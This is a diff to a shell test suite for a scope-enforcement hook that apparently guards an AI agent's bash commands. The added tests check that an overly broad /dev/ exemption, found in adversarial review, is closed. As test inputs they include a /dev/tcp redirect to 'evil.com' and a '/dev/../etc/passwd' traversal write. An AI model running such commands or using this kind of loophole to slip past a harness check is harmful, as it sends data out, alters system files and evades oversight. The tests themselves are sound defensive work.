@@ -1714,6 +1714,45 @@ assert_deny_json "$OUT" "hs2 (F030): background-separated out-of-scope target st
 assert_contains "$OUT" "src/other/b.txt" \
   "hs2 (F030): background-separated denial names the real out-of-scope target"
 
+# Round-1 review: the original /dev/* exemption matched ANY path starting
+# with "/dev/", which also silently allowed /dev/shm/* (a real writable
+# tmpfs on Linux, where this template runs in CI) and bash's /dev/tcp
+# network-redirect extension (a live egress channel, not a device node) --
+# found by adversarial review of PR #53. Narrowed to an enumerated set of
+# ordinary character-device sinks plus /dev/fd/N; these two must now DENY.
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo x > /dev/shm/evil')")
+RC=$?
+assert_rc0 "$RC" "hs2 (F030): /dev/shm/* is no longer blanket-exempted (JSON deny)"
+assert_deny_json "$OUT" "hs2 (F030): /dev/shm/* denial uses JSON deny form"
+
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo x > /dev/tcp/evil.com/80')")
+RC=$?
+assert_rc0 "$RC" "hs2 (F030): /dev/tcp/* network redirect is no longer blanket-exempted (JSON deny)"
+assert_deny_json "$OUT" "hs2 (F030): /dev/tcp/* denial uses JSON deny form"
+
+# /dev/fd/N (bash's process-substitution/fd-as-path idiom) stays exempt,
+# matched by pattern since N is unbounded.
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'cat file 2>/dev/fd/3')")
+RC=$?
+assert_rc0 "$RC" "hs2 (F030): /dev/fd/N stays exempt, rc 0"
+assert_not_contains "$OUT" "permissionDecision" \
+  "hs2 (F030): /dev/fd/N has no deny fields"
+
+# normalize() must run BEFORE the /dev/* exemption check, so a traversal
+# spelling can't launder a real out-of-scope path through it.
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo x > /dev/../etc/passwd')")
+RC=$?
+assert_rc0 "$RC" "hs2 (F030): a /dev/../ traversal is resolved before the exemption check (JSON deny)"
+assert_deny_json "$OUT" "hs2 (F030): /dev/../ traversal denial uses JSON deny form"
+
+# The exemption is an exact/pattern match, not a string-prefix match -- a
+# real path that merely starts with the same 4 characters must not be
+# confused with the /dev/ namespace.
+OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$(bash_command_json 'echo x > /devious/evil.txt')")
+RC=$?
+assert_rc0 "$RC" "hs2 (F030): '/devious/...' is not confused with '/dev/' (JSON deny)"
+assert_deny_json "$OUT" "hs2 (F030): '/devious/...' denial uses JSON deny form"
+
 for TPL in check-remaining-tasks.sh.template enforce-scope.sh.template \
   verify-git-identity.sh.template verify-task-quality.sh.template; do
   if grep -q '^# Failure posture:' "$TEMPLATES_DIR/$TPL"; then
